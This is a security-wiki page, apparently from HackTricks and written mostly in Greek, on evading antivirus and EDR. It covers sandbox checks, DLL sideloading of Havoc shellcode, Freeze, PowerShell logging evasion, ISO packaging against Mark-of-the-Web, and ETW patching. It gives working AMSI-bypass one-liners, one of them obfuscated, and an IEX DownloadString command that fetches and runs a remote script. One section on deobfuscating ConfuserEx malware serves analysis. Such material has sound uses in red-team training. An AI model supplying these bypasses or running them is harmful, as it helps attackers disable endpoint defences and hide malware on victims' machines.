# Παράκαμψη Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Απενεργοποίηση Defender

- [defendnot](https://github.com/es3n1n/defendnot): Εργαλείο που σταματά το Windows Defender από το να λειτουργεί.
- [no-defender](https://github.com/es3n1n/no-defender): Εργαλείο που σταματά το Windows Defender από το να λειτουργεί προσποιούμενο άλλο AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Προς το παρόν, τα AV χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι: static detection, dynamic analysis, και για τα πιο προχωρημένα EDRs, behavioural analysis.

### **Static detection**

Η στατική ανίχνευση επιτυγχάνεται σηματοδοτώντας γνωστά κακόβουλα strings ή arrays bytes σε ένα binary ή script, καθώς και εξαγάγοντας πληροφορίες από το ίδιο το αρχείο (π.χ. file description, company name, digital signatures, icon, checksum, κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών public tools μπορεί να σε κάνει να εντοπιστείς πιο εύκολα, καθώς πιθανώς έχουν ήδη αναλυθεί και σηματοδοτηθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι να αποφύγεις αυτό το είδος ανίχνευσης:

- **Encryption**

  Αν κρυπτογραφήσεις το binary, δεν θα υπάρχει τρόπος για το AV να εντοπίσει το πρόγραμμα σου, αλλά θα χρειαστείς κάποιο loader για να αποκρυπτογραφήσεις και να τρέξεις το πρόγραμμα στη μνήμη.

- **Obfuscation**

  Κάποιες φορές αρκεί να αλλάξεις μερικά strings στο binary ή script προκειμένου να περάσει από το AV, αλλά αυτό μπορεί να είναι χρονοβόρο ανάλογα με το τι προσπαθείς να obfuscate.

- **Custom tooling**

  Αν αναπτύξεις τα δικά σου εργαλεία, δεν θα υπάρχει γνωστή κακή υπογραφή, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Συνιστώ ανεπιφύλακτα να δείτε αυτήν την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) για πρακτική AV Evasion.

### **Dynamic analysis**

Η δυναμική ανάλυση είναι όταν το AV τρέχει το binary σου σε ένα sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια να αποκρυπτογραφήσει και να διαβάσει τους κωδικούς του browser, εκτέλεση minidump στο LSASS, κ.λπ.). Αυτό το κομμάτι μπορεί να είναι πιο δύσκολο, αλλά εδώ είναι μερικά πράγματα που μπορείς να κάνεις για να αποφύγεις sandboxes.

- **Sleep before execution** Ανάλογα με το πώς έχει υλοποιηθεί, μπορεί να είναι ένας καλός τρόπος για να παρακάμψεις τη dynamic analysis του AV. Τα AV έχουν πολύ λίγο χρόνο για να σκανάρουν αρχεία ώστε να μην διακόπτουν τη ροή εργασίας του χρήστη, οπότε η χρήση μεγάλων sleep μπορεί να διαταράξει την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά sandboxes μπορούν απλά να παραλείψουν το sleep ανάλογα με την υλοποίησή τους.
- **Checking machine's resources** Συνήθως τα sandboxes έχουν πολύ περιορισμένους πόρους (π.χ. < 2GB RAM), αλλιώς θα μπορούσαν να επιβραδύνουν το μηχάνημα του χρήστη. Μπορείς επίσης να γίνεις πολύ δημιουργικός εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμα και τις ταχύτητες των ανεμιστήρων — δεν θα υλοποιούνται τα πάντα μέσα στο sandbox.
- **Machine-specific checks** Αν θέλεις να στοχεύσεις έναν χρήστη του οποίου ο σταθμός εργασίας είναι συνδεδεμένος στο domain "contoso.local", μπορείς να ελέγξεις το domain του υπολογιστή για να δεις αν ταιριάζει με αυτό που έχεις ορίσει — αν όχι, μπορείς να τερματίσεις το πρόγραμμα σου.

Αποδεικνύεται ότι το όνομα υπολογιστή του Microsoft Defender's Sandbox είναι HAL9TH, οπότε μπορείς να ελέγξεις το computer name στο malware σου πριν την εκτόξευση· αν το όνομα ταιριάζει με HAL9TH, σημαίνει ότι βρίσκεσαι μέσα στο defender's sandbox, οπότε μπορείς να κάνεις το πρόγραμμα σου να τερματίσει.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές άλλες πολύ καλές συμβουλές από [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev κανάλι</p></figcaption></figure>

Όπως είπαμε και πριν σε αυτό το άρθρο, τα **public tools** τελικά **θα ανιχνευτούν**, οπότε θα πρέπει να θέσεις στον εαυτό σου το εξής ερώτημα:

Για παράδειγμα, αν θέλεις να κάνεις dump το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσεις το mimikatz**; Ή μπορείς να χρησιμοποιήσεις κάποιο άλλο project που είναι λιγότερο γνωστό και επίσης κάνει dump το LSASS.

Η σωστή απάντηση είναι πιθανότατα το δεύτερο. Παίρνοντας το mimikatz ως παράδειγμα, είναι πιθανόν ένα από τα, αν όχι το πιο σηματοδοτημένο κομμάτι malware από AVs και EDRs — ενώ το project καθεαυτό είναι πολύ καλό, είναι επίσης εφιάλτης να δουλεύεις με αυτό για να αποφύγεις τα AVs, οπότε απλά ψάξε για εναλλακτικές για αυτό που προσπαθείς να πετύχεις.

> [!TIP]
> Όταν τροποποιείς τα payloads σου για evasion, φρόντισε να **απενεργοποιήσεις την αυτόματη αποστολή δειγμάτων** στο Defender, και σε παρακαλώ, σοβαρά, **DO NOT UPLOAD TO VIRUSTOTAL** αν ο στόχος σου είναι να πετύχεις evasion μακροπρόθεσμα. Αν θες να ελέγξεις αν το payload σου ανιχνεύεται από κάποιο συγκεκριμένο AV, εγκατέστησέ το σε μια VM, προσπάθησε να απενεργοποιήσεις την αυτόματη αποστολή δειγμάτων και δοκίμασέ το εκεί μέχρι να μείνεις ικανοποιημένος με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατόν, πάντα **προτίμησε να χρησιμοποιείς DLLs για evasion**, από την εμπειρία μου, τα αρχεία DLL συνήθως **ανιχνεύονται πολύ λιγότερο** και αναλύονται λιγότερο, οπότε είναι ένα πολύ απλό κόλπο για να αποφύγεις την ανίχνευση σε κάποιες περιπτώσεις (εφόσον το payload σου έχει κάποιο τρόπο να τρέξει ως DLL φυσικά).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από Havoc έχει detection rate 4/26 στο antiscan.me, ενώ το EXE payload έχει detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me σύγκριση ενός απλού Havoc EXE payload vs ενός απλού Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείς να χρησιμοποιήσεις με αρχεία DLL για να γίνεις πολύ πιο stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** εκμεταλλεύεται το DLL search order που χρησιμοποιεί ο loader τοποθετώντας τόσο την εφαρμογή-θύμα όσο και το κακόβουλο payload δίπλα-δίπλα.

Μπορείς να ελέγξεις για προγράμματα ευάλωτα σε DLL Sideloading χρησιμοποιώντας [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα προγραμμάτων ευπαθών σε DLL hijacking μέσα στο "C:\Program Files\\" και τα DLL αρχεία που προσπαθούν να φορτώσουν.

Σας συνιστώ ανεπιφύλακτα να **explore DLL Hijackable/Sideloadable programs yourself**, αυτή η τεχνική είναι αρκετά stealthy αν γίνει σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά DLL Sideloadable προγράμματα, μπορεί να πιαστείτε εύκολα.

Απλώς τοποθετώντας ένα κακόβουλο DLL με το όνομα που το πρόγραμμα περιμένει να φορτώσει, δεν θα φορτώσει το payload σας, καθώς το πρόγραμμα περιμένει κάποιες συγκεκριμένες συναρτήσεις μέσα σε εκείνο το DLL. Για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

**DLL Proxying** προωθεί τα calls που κάνει ένα πρόγραμμα από το proxy (and malicious) DLL προς το original DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το έργο [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα DLL source code template και την αρχική μετονομασμένη DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (κωδικοποιημένο με [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν ποσοστό ανίχνευσης 0/26 στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Σας **συνιστώ ανεπιφύλακτα** να παρακολουθήσετε το [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) για το DLL Sideloading και επίσης το [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα για όσα συζητήσαμε πιο αναλυτικά.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με διακριτικό τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Η παράκαμψη ανίχνευσης είναι ένα παιχνίδι γάτας και ποντικιού — ό,τι λειτουργεί σήμερα μπορεί να ανιχνευτεί αύριο, οπότε μην βασίζεστε μόνο σε ένα εργαλείο. Αν είναι δυνατόν, προσπαθήστε να συνδυάσετε πολλαπλές τεχνικές αποφυγής.

## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέψει "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώσουν μόνο **αρχεία στο δίσκο**, οπότε αν με κάποιον τρόπο εκτελούσατε payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε επαρκή ορατότητα.

Το χαρακτηριστικό AMSI ενσωματώνεται στα ακόλουθα στοιχεία των Windows.

- User Account Control, or UAC (ανύψωση EXE, COM, MSI, ή εγκατάσταση ActiveX)
- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Office VBA macros

Σας επιτρέπει να ελέγχειτε τη συμπεριφορά των scripts εκθέτοντας το περιεχόμενο των scripts σε μορφή που δεν είναι κρυπτογραφημένη ή απο-οβελισμένη.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα παράγει την ακόλουθη ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προθέτει `amsi:` και στη συνέχεια την διαδρομή προς το εκτελέσιμο από το οποίο τρέχει το script, σε αυτή την περίπτωση powershell.exe

Δεν αφήσαμε κανένα αρχείο στο δίσκο, αλλά παρ' όλα αυτά πιάσαμε σε μνήμη λόγω του AMSI.

Επιπλέον, ξεκινώντας από **.NET 4.8**, ο C# κώδικας περνάει επίσης από το AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για φόρτωση σε μνήμη. Γι' αυτό συνιστάται η χρήση χαμηλότερων εκδόσεων του .NET (όπως 4.7.2 ή παλαιότερες) για εκτέλεση in-memory αν θέλετε να αποφύγετε το AMSI.

Υπάρχουν μερικοί τρόποι για να παρακάμψετε το AMSI:

- **Obfuscation**

Δεδομένου ότι το AMSI λειτουργεί κυρίως με static detections, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος για να αποφύγετε την ανίχνευση.

Ωστόσο, το AMSI έχει τη δυνατότητα να απο-οβελίζει scripts ακόμη και αν έχουν πολλαπλά επίπεδα obfuscation, οπότε η obfuscation μπορεί να είναι κακή επιλογή ανάλογα με το πώς γίνεται. Αυτό την καθιστά όχι και τόσο αυτονόητη για παράκαμψη. Αν και, μερικές φορές, το μόνο που χρειάζεται είναι να αλλάξετε μερικά variable names και θα είστε εντάξει, οπότε εξαρτάται από το πόσο έχει σημαδευτεί κάτι.

- **AMSI Bypass**

Εφόσον το AMSI υλοποιείται με τη φόρτωση ενός DLL μέσα στη διεργασία του powershell (επίσης cscript.exe, wscript.exe κ.λπ.), είναι δυνατό να χειραγωγηθεί εύκολα ακόμη και τρέχοντας ως μη προνομιούχος χρήστης. Λόγω αυτού του σφάλματος στην υλοποίηση του AMSI, ερευνητές έχουν βρει πολλούς τρόπους να παρακάμψουν το AMSI scanning.

**Forcing an Error**

Αναγκάζοντας την αρχικοποίηση του AMSI να αποτύχει (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για τη τρέχουσα διεργασία. Αρχικά αυτό αποκαλύφθηκε από [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft έχει αναπτύξει ένα signature για να αποτρέψει ευρύτερη χρήση.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Αρκούσε μία γραμμή κώδικα powershell για να καταστήσει το AMSI μη λειτουργικό για την τρέχουσα διεργασία του powershell. Αυτή η γραμμή έχει, φυσικά, επισημανθεί από το AMSI, οπότε χρειάζεται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Ακολουθεί ένας τροποποιημένος AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Λάβετε υπόψη ότι αυτό πιθανότατα θα επισημανθεί μόλις δημοσιευτεί αυτή η ανάρτηση, οπότε δεν θα πρέπει να δημοσιεύσετε κανένα code αν το σχέδιό σας είναι να παραμείνετε απαρατήρητοι.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Διαβάστε [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Remove the detected signature**

Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε την ανιχνευμένη υπογραφή AMSI από τη μνήμη της τρέχουσας διεργασίας. Αυτό το εργαλείο λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για την υπογραφή AMSI και στη συνέχεια την αντικαθιστά με εντολές NOP, αφαιρώντας την ουσιαστικά από τη μνήμη.

**AV/EDR products that uses AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging είναι μια δυνατότητα που σας επιτρέπει να καταγράφετε όλες τις εντολές PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς auditing και troubleshooting, αλλά μπορεί επίσης να αποτελέσει ένα **πρόβλημα για επιτιθέμενους που θέλουν να αποφύγουν την ανίχνευση**.

Για να παρακάμψετε το PowerShell logging, μπορείτε να χρησιμοποιήσετε τις παρακάτω τεχνικές:

- **Disable PowerShell Transcription and Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Use Powershell version 2**: Αν χρησιμοποιήσετε το PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να τρέξετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε έτσι: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Χρησιμοποιήστε [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να ξεκινήσετε μια powershell χωρίς άμυνες (αυτό είναι που χρησιμοποιεί το `powerpick` από Cobal Strike).


## Obfuscation

> [!TIP]
> Several obfuscation techniques βασίζονται στην κρυπτογράφηση δεδομένων, η οποία θα αυξήσει την εντροπία του binary και θα διευκολύνει τα AVs και EDRs να το εντοπίσουν. Να είστε προσεκτικοί με αυτό και ίσως εφαρμόστε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή πρέπει να κρυφτούν.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Κατά την ανάλυση malware που χρησιμοποιεί ConfuserEx 2 (ή εμπορικά forks) είναι σύνηθες να αντιμετωπίζετε πολλαπλά επίπεδα προστασίας που θα μπλοκάρουν decompilers και sandboxes. Το παρακάτω workflow επαναφέρει με αξιοπιστία ένα **σχεδόν αυθεντικό IL** που μπορεί στη συνέχεια να αποδιαμορφωθεί σε C# σε εργαλεία όπως dnSpy ή ILSpy.

1.  Anti-tampering removal – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`). Αυτό επίσης τροποποιεί το PE checksum, οπότε οποιαδήποτε τροποποίηση θα κάνει το binary να καταρρεύσει. Χρησιμοποιήστε **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα XOR keys και να γράψετε ένα καθαρό assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Το output περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`) που μπορεί να είναι χρήσιμες όταν φτιάχνετε τον δικό σας unpacker.

2.  Symbol / control-flow recovery – τροφοδοτήστε το *clean* αρχείο στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – επιλέγει το ConfuserEx 2 profile  
• de4dot θα αναιρέσει το control-flow flattening, θα αποκαταστήσει τα αρχικά namespaces, classes και ονόματα μεταβλητών και θα αποκρυπτογραφήσει τις σταθερές συμβολοσειρές.

3.  Proxy-call stripping – Το ConfuserEx αντικαθιστά απευθείας κλήσεις με ελαφριά wrappers (aka *proxy calls*) για να κάνει πιο δύσκολη την decompilation. Αφαιρέστε τα με το **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα θα πρέπει να δείτε κανονικά .NET API όπως `Convert.FromBase64String` ή `AES.Create()` αντί για αδιαφανείς wrapper συναρτήσεις (`Class8.smethod_10`, …).

4.  Manual clean-up – τρέξτε το προκύπτον binary υπό dnSpy, αναζητήστε μεγάλα Base64 blobs ή χρήση `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload. Συχνά το malware το αποθηκεύει ως ένα TLV-encoded byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειάζεται να τρέξετε το κακόβουλο δείγμα – χρήσιμο όταν δουλεύετε σε offline workstation.

> 🛈  ConfuserEx παράγει ένα custom attribute με όνομα `ConfusedByAttribute` που μπορεί να χρησιμοποιηθεί ως IOC για αυτόματη τριαρίσματος δειγμάτων.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ο στόχος αυτού του έργου είναι να παρέχει ένα fork ανοιχτού κώδικα της [LLVM](http://www.llvm.org/) σουίτας μεταγλώττισης, ικανό να αυξήσει την ασφάλεια του λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς να χρησιμοποιήσετε τη γλώσσα `C++11/14` για να δημιουργήσετε, κατά το compile time, obfuscated code χωρίς να χρησιμοποιήσετε οποιοδήποτε εξωτερικό εργαλείο και χωρίς να τροποποιήσετε τον compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated operations που παράγονται από το πλαίσιο C++ template metaprogramming, το οποίο θα κάνει τη ζωή του ατόμου που θέλει να crack the application λίγο πιο δύσκολη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να obfuscate διάφορα pe αρχεία, συμπεριλαμβανομένων: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή metamorphic code engine για arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα fine-grained code obfuscation framework για γλώσσες που υποστηρίζονται από LLVM, χρησιμοποιώντας ROP (return-oriented programming). Το ROPfuscator obfuscates ένα πρόγραμμα σε επίπεδο assembly code μετατρέποντας κανονικές εντολές σε ROP chains, υπονομεύοντας την φυσική μας αντίληψη του normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

## SmartScreen & MoTW

Ίσως έχετε δει αυτή την οθόνη όταν κατεβάζετε κάποια εκτελέσιμα από το internet και τα εκτελείτε.

Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφάλειας που στοχεύει στην προστασία του τελικού χρήστη από την εκτέλεση πιθανώς κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen δουλεύει κυρίως με μια προσέγγιση βασισμένη στη φήμη, που σημαίνει ότι εφαρμογές με σπάνιες λήψεις θα ενεργοποιήσουν το SmartScreen, ειδοποιώντας και εμποδίζοντας τον τελικό χρήστη από το να εκτελέσει το αρχείο (αν και το αρχείο μπορεί ακόμα να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).

**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier, που δημιουργείται αυτόματα όταν κατεβάζονται αρχεία από το internet, μαζί με το URL από το οποίο κατέβηκαν.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατέβηκε από το internet.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι εκτελέσιμα υπογεγραμμένα με ένα **trusted** signing certificate **δεν θα ενεργοποιήσουν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος να εμποδίσετε τα payloads σας να λάβουν το Mark of The Web είναι να τα πακετάρετε μέσα σε κάποιο container όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που πακετάρει payloads σε output containers για να αποφύγει το Mark-of-the-Web.

Παράδειγμα χρήσης:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows που επιτρέπει σε εφαρμογές και συστατικά του συστήματος να **log events**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για να παρακολουθούν και να ανιχνεύουν κακόβουλες δραστηριότητες.

Παρόμοια με το πώς απενεργοποιείται (bypassed) το AMSI, είναι επίσης δυνατό να κάνετε τη συνάρτηση **`EtwEventWrite`** της διεργασίας user space να επιστρέφει ακαριαία χωρίς να καταγράφει γεγονότα. Αυτό επιτυγχάνεται κάνοντας patch στη συνάρτηση στη μνήμη ώστε να επιστρέφει αμέσως, ουσιαστικά απενεργοποιώντας την καταγραφή ETW για εκείνη τη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες σε **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Το loading C# binaries στη μνήμη είναι γνωστό εδώ και καιρό και παραμένει ένας πολύ καλός τρόπος για να τρέξετε τα post-exploitation εργαλεία σας χωρίς να εντοπιστείτε από το AV.

